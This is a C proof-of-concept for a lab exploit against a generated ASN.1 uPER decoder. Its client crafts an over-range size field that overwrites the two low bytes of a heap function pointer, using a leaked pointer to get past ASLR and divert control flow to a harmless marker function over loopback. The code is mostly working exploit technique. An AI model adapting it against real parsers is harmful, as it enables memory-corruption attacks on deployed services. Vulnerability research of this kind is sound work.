/* ASLR-resistant partial-pointer overwrite probe for the pinned over-range
 * uPER size-field write.  A lab-constructed loopback consumer embeds the
 * generated SIZE(0..17) Payload first in a heap Session, with a callback
 * pointer at Payload offset 24.  Instead of a full 8-byte overwrite with a
 * hardcoded -no-pie address (Result 4), count=22 makes the real runtime store
 * exactly two chosen bytes onto the pointer's low half; its ASLR-randomized
 * upper six bytes survive.  The server leaks the live pointer's low 16 bits on
 * its first connection, which is an ordinary diagnostic-shaped leak; the
 * client adds the binary's fixed marker-minus-safe_handler offset (from nm,
 * an offline artifact) and sends those two bytes on the second connection.
 *
 * This is NOT a real ASN.1 application: the Session layout, the leak and the
 * benign marker are lab conditions.  Loopback only (127.0.0.1).
 *
 * Usage: pie-partial server PORT COUNT
 *        pie-partial client PORT DELTA        (DELTA = marker - safe_handler)
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stddef.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include "asn1crt_encoding.h"
#include "schema.h"

typedef struct {
    Payload payload;                   /* generated type, sizeof 24 */
    void (* volatile handler)(void);   /* x86-64 offset 24 */
    unsigned char canary[8];           /* offset 32 */
} Session;

static void safe_handler(void) { puts("SAFE: original handler intact"); }
static void marker(void) { puts("MARKER: control-flow diverted to chosen address"); }

static void put_bits(unsigned char *buf, int *bitpos, unsigned value, int nbits)
{
    int i;
    for (i = nbits - 1; i >= 0; i--) {
        if ((value >> i) & 1)
            buf[*bitpos / 8] |= (unsigned char)(0x80 >> (*bitpos % 8));
        (*bitpos)++;
    }
}

static int read_full(int fd, unsigned char *buf, int n)
{
    int got = 0;
    while (got < n) {
        ssize_t r = read(fd, buf + got, (size_t)(n - got));
        if (r <= 0) return -1;
        got += (int)r;
    }
    return 0;
}

static int loopback_connect(int port)
{
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in sa;
    if (fd < 0) return -1;
    memset(&sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_port = htons((uint16_t)port);
    sa.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    if (connect(fd, (struct sockaddr *)&sa, sizeof(sa)) != 0) {
        close(fd);
        return -1;
    }
    return fd;
}

int main(int argc, char **argv)
{
    const char *role = argc > 1 ? argv[1] : "server";
    int port = argc > 2 ? atoi(argv[2]) : 39291;
    unsigned char chosen[64], wire[128];
    int bitpos = 0, wlen = (5 + 22 * 8 + 7) / 8, i;
    setvbuf(stdout, NULL, _IONBF, 0);

    if (!strcmp(role, "client")) {
        /* First connection: read the low-16 diagnostic leak. */
        unsigned char line[64];
        int n = 0, fd = loopback_connect(port);
        unsigned leak, target, delta;
        if (fd < 0 || argc < 4) return 2;
        while (n < (int)sizeof(line) - 1) {
            ssize_t r = read(fd, line + n, 1);
            if (r <= 0) break;
            n++;
            if (line[n - 1] == '\n') break;
        }
        close(fd);
        line[n] = 0;
        if (sscanf((char *)line, "LEAK %x", &leak) != 1) {
            fprintf(stderr, "client: bad leak line '%s'\n", line);
            return 2;
        }
        delta = (unsigned)strtoul(argv[3], NULL, 0);
        target = (leak + delta) & 0xffffu;
        printf("client leak_low16=%04x delta=%04x target_low16=%04x\n",
               leak, delta, target);

        /* Second connection: count=22 writes Payload offsets 4..25, i.e.
         * chosen bytes 0..19 before the pointer and 20..21 on its low half. */
        memset(chosen, 0x5a, sizeof(chosen));
        chosen[20] = (unsigned char)(target & 0xffu);
        chosen[21] = (unsigned char)((target >> 8) & 0xffu);
        memset(wire, 0, sizeof(wire));
        put_bits(wire, &bitpos, 22, 5);
        for (i = 0; i < 22; i++) put_bits(wire, &bitpos, chosen[i], 8);
        wlen = (bitpos + 7) / 8;
        fd = loopback_connect(port);
        if (fd < 0) return 2;
        if (write(fd, wire, (size_t)wlen) != wlen) { close(fd); return 2; }
        printf("client sent %d bytes count=22 chosen20..21=%02x %02x\n",
               wlen, chosen[20], chosen[21]);
        close(fd);
        return 0;
    }

    {
        int lfd = socket(AF_INET, SOCK_STREAM, 0), fd, yes = 1;
        struct sockaddr_in sa;
        socklen_t sl = sizeof(sa);
        Session *s;
        BitStream bs;
        int err = -1, j;
        flag ok;
        uintptr_t orig;
        size_t hoff;
        if (lfd < 0) return 2;
        setsockopt(lfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(yes));
        memset(&sa, 0, sizeof(sa));
        sa.sin_family = AF_INET;
        sa.sin_port = htons((uint16_t)port);
        sa.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
        if (bind(lfd, (struct sockaddr *)&sa, sizeof(sa)) != 0) return 2;
        if (listen(lfd, 2) != 0) return 2;

        s = (Session *)calloc(1, sizeof(Session));
        if (!s) return 2;
        s->handler = safe_handler;
        memset(s->canary, 0xC0, sizeof(s->canary));
        orig = (uintptr_t)s->handler;
        hoff = offsetof(Session, handler) - offsetof(Session, payload);

        /* Connection 1: low-16 diagnostic leak of the live pointer. */
        fd = accept(lfd, (struct sockaddr *)&sa, &sl);
        if (fd < 0) return 2;
        printf("server sizeof(Session)=%zu handler at Payload offset %zu"
               " orig_handler=%p orig_low16=%04x\n",
               sizeof(Session), hoff, (void *)orig,
               (unsigned)(orig & 0xffffu));
        {
            char leakline[32];
            int ll = snprintf(leakline, sizeof(leakline), "LEAK %04x\n",
                              (unsigned)(orig & 0xffffu));
            if (write(fd, leakline, (size_t)ll) != ll) { close(fd); return 2; }
        }
        close(fd);

        /* Connection 2: hostile uPER packet, decoded by the pinned runtime. */
        fd = accept(lfd, (struct sockaddr *)&sa, &sl);
        if (fd < 0) return 2;
        close(lfd);
        if (read_full(fd, wire, wlen) != 0) { close(fd); return 2; }
        close(fd);

        BitStream_AttachBuffer(&bs, wire, (long)wlen);
        ok = Payload_Decode(&s->payload, &bs, &err);
        printf("svc ok=%d err=%d decoded=%d orig=%p handler=%p"
               " safe=%p marker=%p high6_same=%d\n",
               ok, err, s->payload.nCount, (void *)orig, (void *)s->handler,
               (void *)safe_handler, (void *)marker,
               ((uintptr_t)s->handler >> 16) == (orig >> 16));
        printf("handler bytes:");
        for (j = 0; j < (int)sizeof(void *); j++)
            printf(" %02x", ((unsigned char *)&s->handler)[j]);
        printf("\ncanary:");
        for (j = 0; j < (int)sizeof(s->canary); j++) printf(" %02x", s->canary[j]);
        printf("\n");
        s->handler();
        return 0;
    }
}
